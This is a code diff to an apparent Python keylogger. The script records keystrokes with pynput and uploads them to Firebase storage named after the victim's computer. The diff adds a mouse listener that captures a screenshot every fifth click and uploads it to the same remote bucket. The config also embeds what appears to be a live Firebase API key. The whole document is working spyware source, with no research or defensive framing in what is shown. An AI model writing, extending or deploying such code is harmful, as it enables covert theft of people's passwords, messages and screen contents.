@@ -1,7 +1,8 @@
 import os
-from pynput.keyboard import Listener
-from datetime import date
+from pynput import keyboard, mouse
+from datetime import datetime as date
 import pyrebase
+import pyautogui
 
 config = {
     'apiKey': "AIzaSyBb3RZaXNh1jZYx_qwW_L6sKOxDzi7pMdA",
@@ -16,18 +17,22 @@ config = {
 firebase = pyrebase.initialize_app(config)
 storage = firebase.storage()
 
+full_currentTime = date.today().strftime('%H:%M:%S %d.%m.%Y')
+today_date = full_currentTime.split(' ')[1]
+
 f = open('data.txt', 'w', encoding='utf-8')
 
 data = ''
+lastThreeKeys=[]
 countDelete = 0
+clicks_counter = 0
 
 
 def on_press(key):
     try:
         if hasattr(key, 'char') and key.char == '0':
             f.close()
-            today_date = date.today().strftime("%d/%m/%Y")
-            today_date = today_date.replace('/', '.')
+
             storage.child(os.environ['COMPUTERNAME'] +
                           '/keylogs_' + today_date + '.txt') \
                 .put('data.txt')
@@ -90,7 +95,24 @@ def printKey(key):
         print(e)
 
 
-# Collect events until released
-with Listener(
-        on_press=on_press) as listener:
-    listener.join()
+def on_click(x, y, button, pressed):
+    global clicks_counter
+
+    clicks_counter += 1
+    if clicks_counter == 5:
+        # take screenshot and upload to firebase storage
+        clicks_counter = 0
+
+        myScreenshot = pyautogui.screenshot()
+        myScreenshot.save('screenshot.jpg')
+
+        storage.child(os.environ['COMPUTERNAME'] +
+                      '/screenshot_' + full_currentTime + '.jpg') \
+            .put('screenshot.jpg')
+
+
+# Collect events of mouse clicks and keyboard keys
+with keyboard.Listener(on_press=on_press) as k_listener, \
+        mouse.Listener(on_click=on_click) as m_listener:
+    k_listener.join()
+    m_listener.join()
